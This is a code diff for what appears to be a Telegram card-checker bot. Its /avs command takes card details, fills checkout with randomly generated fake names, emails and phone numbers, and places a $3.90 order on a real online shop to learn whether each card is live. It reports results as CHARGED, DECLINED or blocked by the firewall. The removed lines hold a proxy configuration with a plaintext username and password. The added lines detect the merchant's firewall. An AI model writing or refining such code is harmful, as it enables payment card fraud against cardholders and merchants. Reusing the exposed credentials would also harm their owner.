@@ -10,15 +10,6 @@ const bot = new TelegramBot(token, { polling: true });
 const app = express();
 app.use(express.json());
 
-const proxyConfig = {
-    host: 'us-east.gw.rayobyte.com',
-    port: 8000,
-    auth: {
-        username: 'tumaob1us_gmail_com-isp',
-        password: 'Ntj9hnVhDb2B6vL4'
-    }
-};
-
 const firstNames = ['Shawn', 'James', 'Michael', 'Robert', 'John', 'David', 'William', 'Richard'];
 const lastNames = ['PHKHKKFG', 'Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Miller', 'Davis'];
 const addresses = [
@@ -49,12 +40,11 @@ bot.onText(/\/avs (.+)/, async (msg, match) => {
         const jar = new CookieJar();
         const client = wrapper(axios.create({
             jar,
-            proxy: proxyConfig,
             timeout: 20000,
             validateStatus: () => true
         }));
 
-        const ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36';
+        const ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
         
         let ip = 'Unknown';
         try {
@@ -68,15 +58,22 @@ bot.onText(/\/avs (.+)/, async (msg, match) => {
         const remail = `shawn${Math.floor(Math.random() * 900 + 100)}@gmail.com`;
         const rphone = '971' + Math.floor(Math.random() * 900 + 100) + Math.floor(Math.random() * 9000 + 1000);
 
-        await client.post('https://fireflyfuel.com/cart/add-item.ajax/id/325', 'skuId=925&quantity=1', {
+        // 1. Add to Cart
+        const addRes = await client.post('https://fireflyfuel.com/cart/add-item.ajax/id/325', 'skuId=925&quantity=1', {
             headers: {
                 'content-type': 'application/x-www-form-urlencoded',
                 'origin': 'https://fireflyfuel.com',
                 'referer': 'https://fireflyfuel.com/shop/dropper',
                 'user-agent': ua,
-                'x-requested-with': 'XMLHttpRequest'
+                'x-requested-with': 'XMLHttpRequest',
+                'accept': 'application/json, text/javascript, */*; q=0.01'
             }
         });
+
+        if (typeof addRes.data === 'string' && addRes.data.includes('html')) {
+            bot.sendMessage(chatId, `❌ **Hinarang ng Firewall ang Add-to-Cart (Direct IP).**`);
+            return;
+        }
 
         await client.get('https://fireflyfuel.com/checkout', {
             headers: { 'referer': 'https://fireflyfuel.com/shop/dropper', 'user-agent': ua }
@@ -160,39 +157,31 @@ bot.onText(/\/avs (.+)/, async (msg, match) => {
                 'origin': 'https://fireflyfuel.com',
                 'referer': 'https://fireflyfuel.com/checkout/payment',
                 'x-requested-with': 'XMLHttpRequest',
-                'user-agent': ua
+                'user-agent': ua,
+                'accept': 'application/json, text/javascript, */*; q=0.01'
             }
         });
 
         const respData = payRes.data;
         const endTime = ((Date.now() - startTime) / 1000).toFixed(2);
         
-        let msgResult = '';
-        if (typeof respData === 'object' && respData !== null) {
-            msgResult = respData.messages ? respData.messages.replace(/<[^>]*>?/gm, '').trim() : JSON.stringify(respData);
-        } else {
-            msgResult = "Nag-respond ng HTML/Text ang server (posibleng block/captcha).";
-        }
-        if (msgResult.length > 200) msgResult = msgResult.substring(0, 200) + '...';
-
         let finalResponse = `Card: ${lista}\n`;
-        if (typeof respData === 'object' && respData !== null && respData.result === 'success') {
-            finalResponse += `STATUS: CHARGED ($3.90)\nOrder ID: ${respData.order_id || 'N/A'}\n`;
-        } else if (msgResult.includes('Address provided does not match')) {
-            finalResponse += `STATUS: CVV / Address Mismatch\n`;
-        } else if (msgResult.includes('Invalid CVV') || msgResult.includes('Insufficient funds')) {
-            finalResponse += `STATUS: CCN (${msgResult})\n`;
+        if (typeof respData === 'object' && respData !== null) {
+            if (respData.result === 'success') {
+                finalResponse += `STATUS: CHARGED ($3.90)\nOrder ID: ${respData.order_id || 'N/A'}\n`;
+            } else {
+                let msgResult = respData.messages ? respData.messages.replace(/<[^>]*>?/gm, '').trim() : 'Declined';
+                finalResponse += `STATUS: DECLINED\nReason: ${msgResult}\n`;
+            }
         } else {
-            finalResponse += `STATUS: BLOCKED / DECLINED\nReason: ${msgResult}\n`;
+            finalResponse += `STATUS: BLOCKED BY FIREWALL\nReason: Server returned HTML page instead of JSON.\n`;
         }
         finalResponse += `Time: ${endTime}s | IP: ${ip}`;
 
         bot.sendMessage(chatId, finalResponse);
 
     } catch (error) {
-        let errMessage = error.message;
-        if (errMessage.length > 200) errMessage = errMessage.substring(0, 200) + '...';
-        bot.sendMessage(chatId, `Error: ${errMessage}`);
+        bot.sendMessage(chatId, `Error: ${error.message}`);
     }
 });
 
